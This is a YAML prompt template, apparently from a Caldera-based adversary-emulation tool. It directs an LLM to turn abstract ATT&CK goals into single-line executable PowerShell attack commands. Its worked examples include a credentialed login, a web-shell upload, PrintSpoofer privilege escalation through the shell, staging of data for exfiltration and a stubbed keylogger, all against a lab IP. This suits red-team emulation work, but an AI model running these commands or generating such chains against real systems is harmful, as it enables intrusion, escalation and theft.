description: "Combine abstract attack flow with environment details to generate concrete attack flow"

prompt: |
  You are a penetration testing expert creating executable attack plans.

  # Abstract Attack Goals

  {abstract_flow}

  # Target Environment

  {environment_description}

  # Task

  Map each abstract goal to concrete attack steps using the specific environment details.

  ## Core Principles (concise, mandatory)

  1) Every node MUST include `environment_specific.commands`
     - Single-line executable PowerShell/command
     - Chain multiple actions in one line with `;`
     - No code blocks/backticks/comments; plain command string only
     - If a real command is impossible, add a simulation stub (e.g., echo); never leave it empty

  2) Enforce environment detail usage
     - Reflect IP/URL/credentials/params/filenames/methods from the environment in the command when applicable
     - No external downloads/URLs unless explicitly provided

  3) Payload/tool priority
     - Priority 1: files explicitly provided in environment/Caldera payloads (already in agent working dir)
     - Priority 2: built-in OS tools (PowerShell/cmd)
     - Priority 3: simulation command if neither is possible

  4) Preserve information
     - Do not drop or simplify environment-specified values (e.g., POST parameter names, credentials, exact URLs)

  ## Output Structure

  ```yaml
  nodes:
    - id: "node_001"
      name: "Attack step name"
      tactic: "MITRE ATT&CK Tactic"
      description: "What this accomplishes"

      environment_specific:
        # Extract ALL details from environment description
        target: "actual IP/hostname"
        url: "actual URL"
        method: "actual HTTP method (POST/GET/etc)"
        params: ["actual", "parameter", "names"]
        credentials:
          username: "actual username"
          password: "actual password"
        payload: "actual filename"
        commands: "PowerShell command in single line"  # required for every node; single-line command
        # Include ANY other details mentioned

  edges:
    - from: "node_id"
      to: "node_id"
      dependency_type: "required"

  execution_order:
    - "node_001"
    - "node_002"
  ```

  ## Examples

  **Example 1: Using provided payload (commands included)**

  Environment says: "Caldera payloads: cmd.asp, deploy.ps1. Login at http://192.168.56.105/login_process.asp using POST with userid/password parameters. Credentials: admin/P@ssw0rd!2020"

  Correct node:
  ```yaml
  - id: "node_001"
    name: "Web Application Login"
    tactic: "initial-access"
    description: "Authenticate using compromised credentials"
    environment_specific:
      target: "192.168.56.105"
      url: "http://192.168.56.105/login_process.asp"
      method: "POST"
      params: ["userid", "password"]
      credentials:
        username: "admin"
        password: "P@ssw0rd!2020"
      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/login_process.asp' -Method POST -Body @{{userid='admin';password='P@ssw0rd!2020'}} -UseBasicParsing"

  - id: "node_002"
    name: "Upload Web Shell"
    tactic: "initial-access"
    description: "Deploy cmd.asp web shell using Caldera payload"
    environment_specific:
      payload: "cmd.asp"  # Caldera automatically downloads to agent working directory
      url: "http://192.168.56.105/upload_handler.asp"
      method: "POST"
      form_field: "file"
      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/upload_handler.asp' -Method POST -InFile .\\cmd.asp -ContentType 'multipart/form-data' -UseBasicParsing"
  ```

  **Example 2: Using native OS tools (commands included)**

  Abstract goal: "Compress collected data for exfiltration"
  No compression tool in environment description.

  Correct node:
  ```yaml
  - id: "node_015"
    name: "Compress Collected Data"
    tactic: "exfiltration"
    description: "Compress data using Windows built-in tools"
    environment_specific:
      commands: "Compress-Archive -Path C:\\Windows\\Temp\\exfil\\* -DestinationPath C:\\Windows\\Temp\\data.zip"
      tool: "PowerShell Compress-Archive"  # 2nd priority: native tool
  ```

  **Example 3: Using simulation/stub (commands included)**

  Abstract goal: "Deploy keylogger for credential harvesting"
  No keylogger in environment description.

  Correct node:
  ```yaml
  - id: "node_020"
    name: "Deploy Keylogger (Simulated)"
    tactic: "credential-access"
    description: "Simulate keylogger deployment"
    environment_specific:
      commands: "echo 'keylogger stub' > C:\\Windows\\Temp\\perfcon.dat; Write-Output 'Keylogger installed (simulated)'"
      simulation: true  # 3rd priority: stub simulation
  ```

  **Example 4: Privilege escalation via web shell (commands included)**

  Environment says: "Use IIS web shell with SeImpersonatePrivilege. Web shell at http://192.168.56.105/uploads/cmd.asp. PrintSpoofer64.exe and deploy.ps1 already copied to C:\\inetpub\\wwwroot\\uploads\\"

  Correct node:
  ```yaml
  - id: "node_007"
    name: "Execute Privilege Escalation"
    tactic: "privilege-escalation"
    description: "Use PrintSpoofer via web shell to escalate to SYSTEM"
    environment_specific:
      url: "http://192.168.56.105/uploads/cmd.asp"
      method: "GET"
      exploit: "PrintSpoofer64.exe"
      commands: "Invoke-WebRequest -Uri 'http://192.168.56.105/uploads/cmd.asp?cmd=start /b C:\\inetpub\\wwwroot\\uploads\\PrintSpoofer64.exe -c \"powershell.exe -ExecutionPolicy Bypass -File C:\\inetpub\\wwwroot\\uploads\\deploy.ps1\"' -UseBasicParsing"
  ```

  **Note**: Technique IDs will be added automatically in post-processing using mitreattack-python.

  **Output YAML only. No explanations.**
